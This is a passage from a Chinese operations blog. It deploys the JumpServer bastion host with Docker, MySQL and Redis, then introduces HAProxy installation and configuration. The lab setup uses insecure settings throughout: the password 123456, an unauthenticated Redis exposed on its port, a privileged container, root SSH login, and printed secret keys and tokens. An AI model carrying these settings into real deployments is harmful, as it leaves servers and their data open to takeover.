root@u1:~<span class="token comment"># mkdir -p /usr/local/jumpserver/etc/mysql/&#123;conf.d,mysql.conf.d&#125;</span>
root@u1:~<span class="token comment"># mkdir -p /data/jumpserver/mysql</span>
<span class="token comment"># 生成配置文件,指定字符集</span>
root@u1:~<span class="token comment"># tee /usr/local/jumpserver/etc/mysql/conf.d/mysql.cnf &lt;&lt;EOF</span>
<span class="token punctuation">[</span>mysql<span class="token punctuation">]</span>
default-character-set<span class="token operator">=</span>utf8	<span class="token comment"># 指定字符集</span>
EOF
root@u1:~<span class="token comment"># tee /usr/local/jumpserver/etc/mysql/mysql.conf.d/mysqld.cnf &lt;&lt;EOF</span>
<span class="token punctuation">[</span>mysqld<span class="token punctuation">]</span>
pid-file<span class="token operator">=</span> /var/run/mysqld/mysqld.pid
<span class="token assign-left variable">socket</span><span class="token operator">=</span> /var/run/mysqld/mysqld.sock
<span class="token assign-left variable">datadir</span><span class="token operator">=</span> /var/lib/mysql
symbolic-links<span class="token operator">=</span><span class="token number">0</span>
character-set-server<span class="token operator">=</span>utf8		<span class="token comment"># 指定字符集</span>
EOF
root@u1:~<span class="token comment"># tree /usr/local/jumpserver/etc/mysql/</span>
/usr/local/jumpserver/etc/mysql/
├── conf.d
│   └── mysql.cnf
└── mysql.conf.d
    └── mysqld.cnf

<span class="token number">2</span> directories, <span class="token number">2</span> files
<span class="token comment"># 启动容器</span>
root@u1:~<span class="token comment"># docker container run -d -it -p 3306:3306 --name mysql --restart always \</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123456</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_DATABASE</span><span class="token operator">=</span>jumpserver <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_USER</span><span class="token operator">=</span>jumpserver <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">MYSQL_PASSWORD</span><span class="token operator">=</span><span class="token number">123456</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-v</span> /data/jumpserver/mysql:/var/lib/mysql <span class="token punctuation">\</span>
<span class="token parameter variable">-v</span> /usr/local/jumpserver/etc/mysql/mysql.conf.d/mysqld.cnf:/etc/mysql/mysql.conf.d/mysqld.cnf <span class="token punctuation">\</span>
<span class="token parameter variable">-v</span> /usr/local/jumpserver/etc/mysql/conf.d/mysql.cnf:/etc/mysql/conf.d/mysql.cnf <span class="token punctuation">\</span>
mysql:5.7.32

<span class="token comment"># 添加root'@'127.0.0.1用户</span>
root@u1:~<span class="token comment"># docker exec -it mysql bash</span>
ot@829aa7ccf010:/<span class="token comment"># mysql -uroot -p123456 -e "CREATE USER 'root'@'127.0.0.1' IDENTIFIED BY \"123456\";"</span>
root@829aa7ccf010:/<span class="token comment"># mysql -uroot -p123456 -e "GRANT ALL ON *.* TO 'root'@'127.0.0.1';"</span></code></pre>

<h3 id="安装-Redis"><a href="#安装-Redis" class="headerlink" title="安装 Redis"></a>安装 Redis</h3><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 拉取镜像</span>
root@u1:~<span class="token comment"># docker pull redis:5.0.10-alpine</span>
<span class="token comment"># 启动容器</span>
root@u1:~<span class="token comment"># docker run -d -p 6379:6379 --name redis --restart always redis:5.0.10-alpine</span>

<span class="token comment"># 另开一台虚拟机，验证redis是否安装成功</span>
<span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$yum</span> <span class="token function">install</span> redis <span class="token parameter variable">-y</span>
<span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$redis</span>-cli <span class="token parameter variable">-h</span> <span class="token number">10.0</span>.0.118
<span class="token number">10.0</span>.0.118:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> info server
<span class="token comment"># Server</span>
redis_version:5.0.10
<span class="token punctuation">..</span>.</code></pre>

<h3 id="部署-JumpServer"><a href="#部署-JumpServer" class="headerlink" title="部署 JumpServer"></a>部署 JumpServer</h3><p>可以单独部署各个组件，为了方便，直接部署全部：jms_all</p>
<p>生成 key 和 token：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@u1:/data/wwwroot/test<span class="token comment"># cat key.sh</span>
<span class="token comment">#!/bin/bash</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">"<span class="token variable">$SECRET_KEY</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token assign-left variable">SECRET_KEY</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /dev/urandom <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-dc</span> A-Za-z0-9 <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">50</span><span class="token variable">)</span></span>
    <span class="token builtin class-name">echo</span> <span class="token string">"SECRET_KEY=<span class="token variable">$SECRET_KEY</span>"</span> <span class="token operator">>></span>~/.bashrc
    <span class="token builtin class-name">echo</span> <span class="token variable">$SECRET_KEY</span>
<span class="token keyword">else</span>
    <span class="token builtin class-name">echo</span> <span class="token variable">$SECRET_KEY</span>
<span class="token keyword">fi</span>
<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">"<span class="token variable">$BOOTSTRAP_TOKEN</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token assign-left variable">BOOTSTRAP_TOKEN</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /dev/urandom <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-dc</span> A-Za-z0-9 <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">16</span><span class="token variable">)</span></span>
    <span class="token builtin class-name">echo</span> <span class="token string">"BOOTSTRAP_TOKEN=<span class="token variable">$BOOTSTRAP_TOKEN</span>"</span> <span class="token operator">>></span>~/.bashrc
    <span class="token builtin class-name">echo</span> <span class="token variable">$BOOTSTRAP_TOKEN</span>
<span class="token keyword">else</span>
    <span class="token builtin class-name">echo</span> <span class="token variable">$BOOTSTRAP_TOKEN</span>
<span class="token keyword">fi</span>
root@u1:/data/wwwroot/test<span class="token comment"># ./key.sh</span>
4NrDPj3azajRYQ6B4MM9pi559G1l3JPOW4i8LkUblSKUM7jojL		<span class="token comment"># SECRET_KEY</span>
p4ecZLj7Q2QTLs1s										<span class="token comment"># BOOTSTRAP_TOKEN</span>
root@u1:/data/wwwroot/test<span class="token comment"># tail -n2 ~/.bashrc</span>
<span class="token assign-left variable">SECRET_KEY</span><span class="token operator">=</span>4NrDPj3azajRYQ6B4MM9pi559G1l3JPOW4i8LkUblSKUM7jojL
<span class="token assign-left variable">BOOTSTRAP_TOKEN</span><span class="token operator">=</span>p4ecZLj7Q2QTLs1s</code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 拉取镜像，官方给的docker镜像版本较低</span>
root@u1:~<span class="token comment"># docker pull jumpserver/jms_all:v2.5.3</span>
<span class="token comment"># 启动容器</span>
root@u1:~<span class="token comment"># docker run -d --name jms_all -p 80:80 -p 2222:2222 --restart always \</span>
<span class="token parameter variable">-v</span> /opt/jumpserver/data:/opt/jumpserver/data <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">SECRET_KEY</span><span class="token operator">=</span>4NrDPj3azajRYQ6B4MM9pi559G1l3JPOW4i8LkUblSKUM7jojL <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">BOOTSTRAP_TOKEN</span><span class="token operator">=</span>p4ecZLj7Q2QTLs1s <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">DB_HOST</span><span class="token operator">=</span><span class="token number">172.17</span>.0.1 <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">DB_PORT</span><span class="token operator">=</span><span class="token number">3306</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">DB_USER</span><span class="token operator">=</span>root <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">DB_PASSWORD</span><span class="token operator">=</span><span class="token number">123456</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">DB_NAME</span><span class="token operator">=</span>jumpserver <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">REDIS_HOST</span><span class="token operator">=</span><span class="token number">172.17</span>.0.1 <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">REDIS_PORT</span><span class="token operator">=</span><span class="token number">6379</span> <span class="token punctuation">\</span>
<span class="token parameter variable">-e</span> <span class="token assign-left variable">REDIS_PASSWORD</span><span class="token operator">=</span><span class="token string">''</span> <span class="token punctuation">\</span>
<span class="token parameter variable">--privileged</span><span class="token operator">=</span>true <span class="token punctuation">\</span>
jumpserver/jms_all:v2.5.3

<span class="token comment"># 验证启动是否成功</span>
root@u1:~<span class="token comment"># docker logs -f jms_all</span>
<span class="token number">2021</span>-01-09 <span class="token number">11</span>:44:43 Sat Jan  <span class="token number">9</span> <span class="token number">11</span>:44:43 <span class="token number">2021</span>
<span class="token number">2021</span>-01-09 <span class="token number">11</span>:44:43 JumpServer version v2.5.3, <span class="token function">more</span> see https://www.jumpserver.org
<span class="token number">2021</span>-01-09 <span class="token number">11</span>:44:43 Check database connection <span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.
<span class="token number">2021</span>-01-09 <span class="token number">11</span>:44:49 Database connect success
<span class="token number">2021</span>-01-09 <span class="token number">11</span>:44:49 Check database structure change <span class="token punctuation">..</span>.
<span class="token number">2021</span>-01-09 <span class="token number">11</span>:44:49 Migrate model change to database <span class="token punctuation">..</span>.
Operations to perform:
  Apply all migrations: admin, applications, assets, audits, auth, authentication, captcha, common, contenttypes, django_cas_ng, django_celery_beat, jms_oidc_rp, ops, orgs, perms, sessions, settings, terminal, tickets, <span class="token function">users</span>
Running migrations:
<span class="token punctuation">..</span>.各种OK<span class="token punctuation">..</span>.
<span class="token number">2021</span>-01-09 <span class="token number">11</span>:45:16 Collect static files
<span class="token number">2021</span>-01-09 <span class="token number">11</span>:45:19 Collect static files <span class="token keyword">done</span>
guacd<span class="token punctuation">[</span><span class="token number">88</span><span class="token punctuation">]</span>: INFO:        Guacamole proxy daemon <span class="token punctuation">(</span>guacd<span class="token punctuation">)</span> version <span class="token number">1.2</span>.0 started
Starting guacd: SUCCESS
Tomcat started.
Jumpserver ALL v2.5.3
官网 http://www.jumpserver.org
文档 http://docs.jumpserver.org

进入容器命令 <span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> jms_all /bin/bash
root@u1:~<span class="token comment"># ll /data/jumpserver/mysql/jumpserver/</span>
total <span class="token number">15648</span>
<span class="token punctuation">..</span>.		<span class="token comment"># 生成的各种表</span></code></pre>

<p><strong>通过 80 端口登录</strong>：浏览器输入 10.0.0.118</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1610164438378.png"></p>
<p>默认账号密码都是 admin，第一次登录需要修改密码，修改密码为 123456</p>
<p><strong>通过 2222 端口登录</strong>：另开一台虚拟机</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$ssh</span> <span class="token parameter variable">-p</span> <span class="token number">2222</span> admin@10.0.0.118
admin@10.0.0.118's password: 	<span class="token comment"># 123456</span>
                Administrator,  欢迎使用JumpServer开源堡垒机系统

        <span class="token number">1</span><span class="token punctuation">)</span> 输入 部分IP，主机名，备注 进行搜索登录<span class="token punctuation">(</span>如果唯一<span class="token punctuation">)</span>.
        <span class="token number">2</span><span class="token punctuation">)</span> 输入 / + IP，主机名，备注 进行搜索，如：/192.168.
        <span class="token number">3</span><span class="token punctuation">)</span> 输入 p 进行显示您有权限的主机.
        <span class="token number">4</span><span class="token punctuation">)</span> 输入 g 进行显示您有权限的节点.
        <span class="token number">5</span><span class="token punctuation">)</span> 输入 d 进行显示您有权限的数据库.
        <span class="token number">6</span><span class="token punctuation">)</span> 输入 k 进行显示您有权限的Kubernetes.
        <span class="token number">7</span><span class="token punctuation">)</span> 输入 r 进行刷新最新的机器和节点信息.
        <span class="token number">8</span><span class="token punctuation">)</span> 输入 h 进行显示帮助.
        <span class="token number">9</span><span class="token punctuation">)</span> 输入 q 进行退出.
Opt<span class="token operator">></span></code></pre>

<h2 id="使用-JumpServer"><a href="#使用-JumpServer" class="headerlink" title="使用 JumpServer"></a>使用 JumpServer</h2><p><img data-src="//img.to2b.cn/blog/ljk/1610164412882.png"></p>
<h3 id="配置邮件"><a href="#配置邮件" class="headerlink" title="配置邮件"></a>配置邮件</h3><p>系统设置 -&gt; 邮件设置：</p>
<p><img data-src="//img.to2b.cn/blog/ljk/1610183524005.png"></p>
<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><h4 id="多因子认证"><a href="#多因子认证" class="headerlink" title="多因子认证"></a>多因子认证</h4><p>创建用户的时候，可以选择开启<strong>多因子认证</strong>功能，就是需要安装手机 APP 谷歌验证器，在登录的时候，打开谷歌验证器输入验证码，二次验证，加强安全性</p>
<p>注意：启用，未来用户可以自己关闭；强制启用，未来用户不可以强制关闭</p>
<p>注意：服务器的时间需要校准，否则谷歌验证器无法通过验证</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">timedatectl set-timezone Asia/Shanghai	<span class="token comment"># 校准服务器时间</span></code></pre>

<h4 id="统审计员"><a href="#统审计员" class="headerlink" title="统审计员"></a>统审计员</h4><p>系统审计员即查看录像带的人，可以实时共享其他用户的终端，可以以录像的方式查看用户的操作历史</p>
<h3 id="管理资产"><a href="#管理资产" class="headerlink" title="管理资产"></a>管理资产</h3><p>jumpserver 内置了 ansible</p>
<p>注意：ubuntu 默认不能使用 root 进行 ssh 连接，需要修改 ssh 配置</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">lujinkai@u1:~$ <span class="token function">sudo</span> <span class="token function">vim</span> /etc/ssh/sshd_config
PermitRootLogin <span class="token function">yes</span>		<span class="token comment"># 在 #PermitRootLogin prohibit-password 下面添加此行</span>
UseDNS no				<span class="token comment"># 加速ssh连接速度</span>
lujinkai@u1:~$ <span class="token function">sudo</span> systemctl restart sshd.service	<span class="token comment"># 重启服务</span></code></pre>

<h4 id="管理用户"><a href="#管理用户" class="headerlink" title="管理用户"></a>管理用户</h4><p>管理用户是资产（被控服务器）上的 root，或拥有 NOPASSWD: ALL sudo 权限的用户， JumpServer 使用该用户来 <code>推送系统用户</code>、<code>获取资产硬件信息</code> 等。</p>
<h4 id="系统用户"><a href="#系统用户" class="headerlink" title="系统用户"></a>系统用户</h4><p>用户使用自己的用户名登录 JumpServer，JumpServer 使用<strong>系统用户</strong>登录资产和应用</p>
<h4 id="命令过滤"><a href="#命令过滤" class="headerlink" title="命令过滤"></a>命令过滤</h4><p>只能是间接禁止，因为虽然禁止的命令不能使用，但是可以通过脚本执行</p>
<h3 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h3><h4 id="资产授权"><a href="#资产授权" class="headerlink" title="资产授权"></a>资产授权</h4><p>有了用户，有了资产，就需要将用户和资产关联起来</p>
<h3 id="应用管理"><a href="#应用管理" class="headerlink" title="应用管理"></a>应用管理</h3><h4 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h4><p>以 mysql 为例：</p>
<ol>
<li>应用管理 –&gt; 数据库 –&gt; 创建</li>
<li>权限管理 –&gt; 系统用户 –&gt; 创建，协议选 mysql</li>
<li>权限管理 –&gt; 应用授权 –&gt; 创建</li>
</ol>
<p>注意：jumpserver2.5.3 版本有 bug，web 终端无法连接数据库，建议选择其他版本，v2.4.4 没有此 bug</p>
<h3 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h3><p>所有用户的所有行为都会被 jumpserver 以录像的形式记录下来，方便在将来出现问题的时候进行追责</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block ljk-index-post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://blog.lujinkai.cn/%E8%BF%90%E7%BB%B4/HAProxy/HAProxy/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="//img.to2b.cn/blog/ljk/1607154764582.png">
      <meta itemprop="name" content="像方便面一样的男子">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="LJKのBlog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | LJKのBlog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/%E8%BF%90%E7%BB%B4/HAProxy/HAProxy/" class="post-title-link" itemprop="url">HAProxy</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-01-04 22:30:28" itemprop="dateCreated datePublished" datetime="2021-01-04T22:30:28+08:00">2021-01-04</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-05-29 16:58:05" itemprop="dateModified" datetime="2023-05-29T16:58:05+08:00">2023-05-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/" itemprop="url" rel="index"><span itemprop="name">运维</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%BF%90%E7%BB%B4/HAProxy/" itemprop="url" rel="index"><span itemprop="name">HAProxy</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="web-架构介绍"><a href="#web-架构介绍" class="headerlink" title="web 架构介绍"></a>web 架构介绍</h2><h3 id="单机房架构"><a href="#单机房架构" class="headerlink" title="单机房架构"></a>单机房架构</h3><p><img data-src="//img.to2b.cn/blog/ljk/1609770705323.png"></p>
<h3 id="多机房架构"><a href="#多机房架构" class="headerlink" title="多机房架构"></a>多机房架构</h3><p><img data-src="//img.to2b.cn/blog/ljk/1609770715875.png"></p>
<h3 id="公有云架构"><a href="#公有云架构" class="headerlink" title="公有云架构"></a>公有云架构</h3><p><img data-src="//img.to2b.cn/blog/ljk/1609770726770.png"></p>
<h3 id="私有云架构"><a href="#私有云架构" class="headerlink" title="私有云架构"></a>私有云架构</h3><p><img data-src="//img.to2b.cn/blog/ljk/1609770737363.png"></p>
<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>负载均衡：Load Balance，简称 LB</p>
<p><strong>负载均衡类型</strong></p>
<ul>
<li><p>四层（传输层）：LVS、Nginx（1.9 之后）、HAProxy</p>
<p>LVS 是集成在内核中的功能，真四层；Nginx 和 HAProxy 是用户空间的软件，伪四层</p>
</li>
<li><p>七层（应用层）：Nginx、HAProxy</p>
</li>
<li><p>硬件：<a target="_blank" rel="noopener" href="https://f5.com/zh">F5</a>、<a target="_blank" rel="noopener" href="https://www.citrix.com.cn/products/citrix-adc/">Netscaler</a>、<a target="_blank" rel="noopener" href="https://www.arraynetworks.com.cn/">Array</a>、<a target="_blank" rel="noopener" href="http://www.sangfor.com.cn/">深信服</a>、<a target="_blank" rel="noopener" href="http://www.lingzhou.com.cn/cpzx/llfzjh/">北京灵州</a></p>
<p>大公司都用 F5</p>
</li>
</ul>
<p><strong>应用场景</strong></p>
<p>企业生产环境中，每天会有很多的需求变更，比如增加服务器、新业务上线、url 路由修改、域名配置等等，对于前端负载均衡设备来说，容易维护，复杂度低，是首选指标</p>
<p>LVS 性能最高，最稳定，但是只支持四层负载 ，百万级并发</p>
<p>HAProxy 四层负载和七层代理都支持，如果只做反向代理，推荐 HAProxy，功能丰富，方便管理，万级并发</p>
<p>Nginx 的功能基于模块实现，HAProxy 有的功能 Nginx 都有，小型系统可以使用 Nginx</p>
<h2 id="HAProxy"><a href="#HAProxy" class="headerlink" title="HAProxy"></a>HAProxy</h2><p>C 语言开发，高性能的 TCP 和 HTTP 负载均衡器，支持基于 cookie 的持久性，自动故障切换，支持正则表达式及 web 状态统计，目前最新 TLS 版本为 2.2</p>
<p>分为企业版和社区版</p>
<ul>
<li>TCP 和 HTTP 反向代理</li>
<li>SSL&#x2F;TSL 服务器</li>
<li>可以针对 HTTP 请求添加 cookie，进行路由后端服务器</li>
<li>可平衡负载至后端服务器，并支持持久连接</li>
<li>支持所有主服务器故障切换至备用服务器</li>
<li>支持专用端口实现监控服务</li>
<li>支持停止接受新连接请求，而不影响现有连接</li>
<li>可以在双向添加，修改或删除 HTTP 报文首部</li>
<li>响应报文压缩</li>
<li>支持基于 pattern 实现连接请求的访问控制</li>
<li>通过特定的 URI 为授权用户提供详细的状态信息</li>
</ul>
<h3 id="HAProxy-安装"><a href="#HAProxy-安装" class="headerlink" title="HAProxy 安装"></a>HAProxy 安装</h3><p>yum 或者 apt 安装的版本较老，推荐编译安装</p>
<p>HAProxy 支持基于 Lua 实现功能扩展</p>
<p><strong>编译安装 Lua</strong>：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://www.lua.org/ftp/lua-5.4.2.tar.gz
<span class="token function">mkdir</span> /usr/local/lua
<span class="token function">tar</span> zxvf lua-5.4.2.tar.gz <span class="token parameter variable">-C</span> /usr/local/lua --strip-components <span class="token number">1</span>
<span class="token builtin class-name">cd</span> /usr/local/lua
<span class="token function">make</span> all <span class="token builtin class-name">test</span>
./src/lua <span class="token parameter variable">-v</span>	<span class="token comment"># Lua 5.4.2  Copyright (C) 1994-2020 Lua.org, PUC-Rio</span></code></pre>

<p><strong>编译安装 HAProxy</strong>：</p>
<p><a target="_blank" rel="noopener" href="http://www.haproxy.org/">http://www.haproxy.org/</a> # 优先下载 LTS 版</p>
<p><a target="_blank" rel="noopener" href="http://www.haproxy.org/download/">http://www.haproxy.org/download/</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://www.haproxy.org/download/2.2/src/haproxy-2.2.6.tar.gz
yum <span class="token parameter variable">-y</span> <span class="token function">install</span> gcc openssl-devel pcre-devel systemd-devel
<span class="token function">mkdir</span> /usr/local/haproxy
<span class="token function">tar</span> zxvf haproxy-2.2.6.tar.gz
<span class="token builtin class-name">cd</span> haproxy-2.2.6/
<span class="token comment"># 参考INSTALL文件进行编译安装</span>
<span class="token function">make</span> <span class="token assign-left variable">ARCH</span><span class="token operator">=</span>x86_64 <span class="token assign-left variable">TARGET</span><span class="token operator">=</span>linux-glibc <span class="token assign-left variable">USE_PCRE</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">USE_OPENSSL</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">USE_ZLIB</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">USE_SYSTEMD</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">USE_LUA</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">LUA_INC</span><span class="token operator">=</span>/usr/local/lua/src/ <span class="token assign-left variable">LUA_LIB</span><span class="token operator">=</span>/usr/local/lua/src/
<span class="token function">make</span> <span class="token function">install</span> <span class="token assign-left variable">PREFIX</span><span class="token operator">=</span>/usr/local/haproxy
<span class="token function">vim</span> /etc/profile	<span class="token comment"># export PATH=/usr/local/haproxy/sbin:$PATH</span>
<span class="token builtin class-name">.</span> /etc/profile
haproxy <span class="token parameter variable">-v</span>
haproxy <span class="token parameter variable">-V</span>
haproxy <span class="token parameter variable">-vv</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> <span class="token function">make</span> gcc build-essential libssl-dev zlib1g-dev libpcre3 libpcre3-dev libsystemd-dev libreadline-dev <span class="token parameter variable">-y</span></code></pre>

<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>查看配置文件示例：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$tree</span> /usr/local/src/haproxy-2.2.6/examples/
/usr/local/src/haproxy-2.2.6/examples/
├── acl-content-sw.cfg
├── content-sw-sample.cfg
├── errorfiles
│   ├── <span class="token number">400</span>.http
│   ├── <span class="token number">403</span>.http
│   ├── <span class="token number">408</span>.http
│   ├── <span class="token number">500</span>.http
│   ├── <span class="token number">502</span>.http
│   ├── <span class="token number">503</span>.http
│   ├── <span class="token number">504</span>.http
│   └── README
├── haproxy.init
├── option-http_proxy.cfg
├── socks4.cfg
├── transparent_proxy.cfg
└── wurfl-example.cfg

<span class="token number">1</span> directory, <span class="token number">15</span> files</code></pre>

<p>创建自定义的配置文件：</p>
<p>HAProxy 的配置文件 haproxy.cfg 由两大部分组成，分别是 global 和 proxies 部分</p>
<ul>
<li><p>global：全局配置段</p>
<p>进程及安全配置相关的参数、性能调整相关参数、Debug 参数</p>
</li>
<li><p>proxies：代理配置段</p>
<ul>
<li>defaults [&lt;name&gt;]：默认配置项，针对以下的 frontend、backend 和 listen 生效，可以多个 name 也可以没有 name</li>
<li>frontend &lt;name&gt;：前端，类似于 Nginx 的 server 和 LVS 的服务集群</li>
<li>backend &lt;name&gt;：后端，相当于 nginx 的 upstream 和 LVS 中的 RS</li>
<li>listen &lt;name&gt;：同时拥有前端和后端配置，配置简单，通常只用于 TCP 协议的应用，适合简单的环境，生产推荐使用</li>
</ul>
</li>
</ul>
<p>以下列举的是部分配置，官方文档：<a target="_blank" rel="noopener" href="http://cbonte.github.io/haproxy-dconv/2.2/configuration.html">http://cbonte.github.io/haproxy-dconv/2.2/configuration.html</a></p>
<h4 id="global"><a href="#global" class="headerlink" title="global"></a>global</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$mkdir</span> /var/lib/haproxy
<span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$mkdir</span> /etc/haproxy
<span class="token punctuation">[</span>root@c71 ~<span class="token punctuation">]</span><span class="token variable">$vim</span> /etc/haproxy/haproxy.cfg
global
    <span class="token function">chroot</span> /usr/local/haproxy	<span class="token comment"># 锁定运行目录</span>
    stats socket /var/lib/haproxy/haproxy.sock mode <span class="token number">600</span> level admin		<span class="token comment"># socket文件</span>
    <span class="token comment">#uid 99</span>
    <span class="token comment">#gid 99</span>
    user haproxy		<span class="token comment"># 运行haproxy的用户</span>
    group haproxy		<span class="token comment"># 运行haproxy的用户组</span>
    daemon
    nbproc <span class="token number">1</span>			<span class="token comment"># 启的haproxy work 进程数，默认进程数是一个</span>
    <span class="token comment"># nbthread 1		# 指定每个haproxy进程开启的线程数，默认为每个进程一个线程，和nbproc配置互斥</span>
    <span class="token comment">#cpu-map 1 0		# 绑定haproxy worker 进程至指定CPU，将第1个work进程绑定至0号CPU</span>
    <span class="token comment">#cpu-map 2 1		# 绑定haproxy worker 进程至指定CPU，将第2个work进程绑定至1号CPU</span>
    <span class="token comment">#cpu-map 3 2</span>
    <span class="token comment">#cpu-map 4 3</span>
    maxconn <span class="token number">100000</span>		<span class="token comment"># 每个haproxy进程的最大并发连接数</span>
   	<span class="token comment"># maxsslconn n		# 每个haproxy进程ssl最大连接数,用于haproxy配置了证书的场景下</span>
   	<span class="token comment"># maxconnrate n		# 每个进程每秒创建的最大连接数量</span>
   	<span class="token comment"># spread-checks n	# 后端server状态check随机提前或延迟百分比时间，建议2-5(20%-50%)之间，默认0</span>
    pidfile /var/lib/haproxy/haproxy.pid	<span class="token comment"># 指定pid文件路径</span>
    <span class="token comment"># log 127.0.0.1 local2 info	  # 全局的syslog服务器；日志服务器需要开启UDP协议，最多可以定义两个</span></code></pre>

<p>HAproxy 本身不记录客户端的访问日志，此外为减少服务器负载，一般生产中 HAProxy 不记录日志</p>
<h4 id="defaults"><a href="#defaults" class="headerlink" title="defaults"></a>defaults</h4><pre class="language-bash" data-language="bash"><code class="language-bash">defaults
    option redispatch		<span class="token comment"># 当server Id对应的服务器挂掉后，强制定向到其他健康的服务器，重新派发</span>
    option abortonclose 	<span class="token comment"># 服务器负载很高时，自动结束当前队列处理比较久的连接，针对业务情况选择开启</span>
    option http-keep-alive	<span class="token comment"># 开启与客户端的会话保持</span>
    option forwardfor		<span class="token comment"># 透传客户端真实IP至后端web服务器</span>
    maxconn <span class="token number">100000</span>
    mode http				<span class="token comment"># http|tcp，设置默认工作类型,使用TCP服务器性能更好，减少压力</span>
    <span class="token function">timeout</span> connect 120s <span class="token comment"># 客户端请求从haproxy到后端server最长连接等待时间(TCP连接之前)，默认单位ms</span>
